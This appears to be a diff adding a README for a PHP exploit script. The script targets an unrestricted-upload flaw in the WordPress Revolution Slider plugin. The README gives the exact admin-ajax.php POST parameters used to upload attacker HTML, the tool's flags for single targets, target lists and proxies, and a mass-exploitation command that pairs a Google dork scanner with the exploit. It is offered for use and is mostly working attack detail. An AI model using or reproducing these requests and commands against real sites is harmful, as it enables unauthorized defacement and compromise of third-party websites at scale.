@@ -1,0 +1,71 @@
+- WORDPRESS Revslider Exploit 0DAY / INURL - BRASIL
+------
+
+```
+  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
+  # Blog:         http://blog.inurl.com.br
+  # Twitter:      https://twitter.com/googleinurl
+  # Fanpage:      https://fb.com/InurlBrasil
+  # Pastebin      http://pastebin.com/u/Googleinurl
+  # GIT:          https://github.com/googleinurl
+  # PSS:          http://packetstormsecurity.com/user/googleinurl
+  # YOUTUBE:      http://youtube.com/c/INURLBrasil
+  # PLUS:         http://google.com/+INURLBrasil
+```
+-   Vulnerability Description
+------
+Exploit Wordpress Plugin Revolution Slider - Unrestricted File Upload
+
+-   Tool Description
+------
+Script perform html upload unauthorized to target
+
+-   REQUEST POST SEND
+------
+```
+array("action" => "revslider_ajax_action","client_action" => "update_captions_css", "data" => _YOU_HTML_);
+```
+
+-   URL REQUEST SEND
+------
+```
+http://{target}/wp-admin/admin-ajax.php
+```
+
+-   URL MODIFIED
+------
+```
+http://{target}/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css
+```
+
+-   COMMAND EXPLOIT --help
+------
+```
+  -t : SET TARGET.
+   -f : SET FILE TARGETS.
+   -p : SET PROXY
+   Execute:
+                 php exploit.php -t target
+                 php exploit.php -f targets
+                 php exploit.php -t target -p 'http://localhost:9090'
+```
+
+-   USE MASS EXPLOIT SCANNER INURLBR
+------
+```
+./inurlbr.php --dork 'inurl:admin-ajax.php?action=revslider_show_image -intext:"revslider_show_image"' -s vull.txt  -q 1,6  --command-all 'php inurl_revslider.php -t _TARGET_'
+```
+
+- DOWNLOAD INURLBR
+------
+https://github.com/googleinurl/SCANNER-INURLBR
+
+- PRINT
+------
+http://i.imgur.com/Fown6vf.png
+
+- REFERENCE
+------
+[1] http://blog.inurl.com.br/2015/03/wordpress-revslider-exploit-0day-inurl.html
+
+[2] http://www.exploit4arab.net/exploits/1405
